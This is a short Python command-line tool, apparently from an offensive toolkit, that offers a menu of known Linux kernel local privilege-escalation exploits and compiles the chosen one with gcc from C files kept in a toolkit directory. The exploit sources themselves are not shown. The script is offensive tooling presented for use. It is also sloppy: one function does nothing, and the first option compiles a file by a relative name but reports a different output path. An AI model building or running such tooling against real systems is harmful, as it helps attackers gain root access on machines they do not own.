import subprocess
import cmd
import os
import sys

def version():
    if sys.version_info < (3,9):
        pass

def menu():
    menu = """
    {1}-Linux Kernel 3.3 < 3.8 (Ubuntu / Fedora 18) - 'sock_diag_handlers()' Local Privilege Escalation
    {2}-Linux Kernel 2.2.25/2.4.24/2.6.2 - 'mremap()'
    {3}-Linux Kernel 3.0 < 3.3.5 - 'CLONE_NEWUSER|CLONE_FS' 
    {4}-inux ubuntu 4.8.0-58-generic
    """
    print(menu)
def clear():
    subprocess.call("clear")
def banner():
    import pyfiglet
    bannes = pyfiglet.figlet_format("privesc")
    print(bannes)
class linux(cmd.Cmd):
    clear()
    version()
    banner()
    menu()
    def do_1(self, line):
        print("check system file")
        print("check compiler")
        print("please wait")
        os.system("bash /usr/share/xfeezer/exxer/make/linux/compilers/compilecheck.sh")
        print("compile the exploit")
        os.system("gcc sock_diag_handlers.c -o ubuntu_fedora18_exploit")
        print("exploit compiled success")
        print("exploit location /usr/share/xfeezer/exxer/make/linux/exploits/ubuntu_fedora18_exploit")
    def do_2(self, line):
        print("checking the compiler")
        print("please wait")
        os.system("bash /usr/share/xfeezer/exxer/make/linux/compilers/compilecheck.sh")
        print("check completed")
        os.system("gcc /usr/share/xfeezer/exxer/make/linux/exploits/160.c -o mremap")
        print("compile finished")
        print("file location => /usr/share/xfeezer/exxer/make/linux/exploits/mremap")
    def do_3(self, line):
        print("checking the compiler")
        os.system("bash /usr/share/xfeezer/exxer/make/linux/compilers/compilecheck.sh")
        print("compiler checked")
        os.system("gcc /usr/share/xfeezer/exxer/make/linux/exploits/cloneuser.c -o cloneuser")
        print("exploit compiled exploit location => /usr/share/xfeezer/exxer/make/linux/exploits/cloneuser")
    def do_4(self,line):
        print("checing compiler please wait")
        os.system("bash /usr/share/xfeezer/exxer/make/linux/compilers/compilecheck.sh")
        print("compiler checked")
        os.system("gcc /usr/share/xfeezer/exxer/make/linux/exploits/generic_4.8.c -o ubuntukernel")
        print("exploit compiled exploit location => /usr/share/xfeezer/exxer/make/linux/exploits/ubuntukernel")
if __name__ == '__main__':
    linux().cmdloop()